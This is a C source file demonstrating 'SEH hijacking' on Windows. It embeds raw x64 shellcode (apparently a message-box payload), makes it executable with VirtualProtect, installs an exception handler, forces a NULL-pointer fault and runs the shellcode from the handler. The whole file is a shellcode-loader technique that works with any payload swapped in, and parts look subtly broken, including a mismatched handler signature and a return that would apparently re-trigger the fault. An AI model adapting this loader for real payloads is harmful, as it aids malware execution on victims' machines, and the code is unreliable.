#include <Windows.h>
#include <stdio.h>

// Shellcode that will execute via exception handler
unsigned char shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
    "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
    "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
    "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
    "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
    "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
    "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
    "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
    "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
    "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
    "\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
    "\x85\x11\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
    "\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c"
    "\x6c\x6f\x20\x66\x72\x6f\x6d\x20\x53\x45\x48\x20\x48\x69\x6a"
    "\x61\x63\x6b\x69\x6e\x67\x21\x00\x48\x65\x6c\x6c\x6f\x20\x57"
    "\x6f\x72\x6c\x64\x21\x00";

// Original exception handler address (to restore)
PVOID g_originalHandler = NULL;

// Custom exception handler that executes shellcode
EXCEPTION_DISPOSITION __cdecl CustomExceptionHandler(
    struct _EXCEPTION_RECORD *ExceptionRecord,
    PVOID EstablisherFrame,
    struct _CONTEXT *ContextRecord,
    PVOID DispatcherContext)
{
    printf("[ SEH ] Exception caught! Executing shellcode...\n");
    printf("[ SEH ] Exception code: 0x%08lx\n", ExceptionRecord->ExceptionCode);
    printf("[ SEH ] Faulting address: %p\n", ExceptionRecord->ExceptionAddress);

    // Execute shellcode directly
    void (*shellcode_func)() = (void (*)())shellcode;
    shellcode_func();

    // Tell system to continue execution
    return ExceptionContinueExecution;
}

// Function that will cause an exception
void CauseException()
{
    printf("[*] Causing intentional exception...\n");

    // Dereference NULL pointer - ACCESS VIOLATION!
    int *p = NULL;
    *p = 0x12345678;
}

int main()
{
    printf("[ SEH Hijacking Demo ]\n");
    printf("[*] Process ID: %d\n", GetCurrentProcessId());
    printf("[*] Shellcode size: %zu bytes\n", sizeof(shellcode));

    // Make shellcode executable
    DWORD oldProtect;
    VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);
    printf("[+] Shellcode memory set to executable\n");

    // METHOD 1: Install SEH handler via thread environment block (TEB)
    printf("\n[*] Installing custom SEH handler...\n");

#ifdef _WIN64
    // x64 uses VEH instead of SEH chaining (simplified)
    printf("[!] x64 uses VEH - using AddVectoredExceptionHandler\n");
    PVOID handle = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)CustomExceptionHandler);
    printf("[+] Vectored handler installed at: %p\n", handle);
#else
    // x86 SEH chaining via TEB
    __asm {
        // Get current SEH handler from TEB
            mov eax, fs:[0]
            mov g_originalHandler, eax

                                              // Install our handler
            push offset CustomExceptionHandler
            push fs:[0]
            mov fs:[0], esp
    }
    printf("[+] SEH handler installed via TEB chaining\n");
#endif

    // Cause exception - handler will execute shellcode
    printf("\n[*] Triggering exception...\n");
    CauseException();

    // This line may not execute if exception handler doesn't continue
    printf("[+] Exception handled, execution continued!\n");

// Restore original handler (x86 only)
#ifndef _WIN64
    __asm {
            mov eax, g_originalHandler
            mov fs:[0], eax
    }
    printf("[+] Original SEH handler restored\n");
#endif

    return 0;
}

// x86_64-w64-mingw32-gcc -o seh_hijacking.exe seh_hijacking.c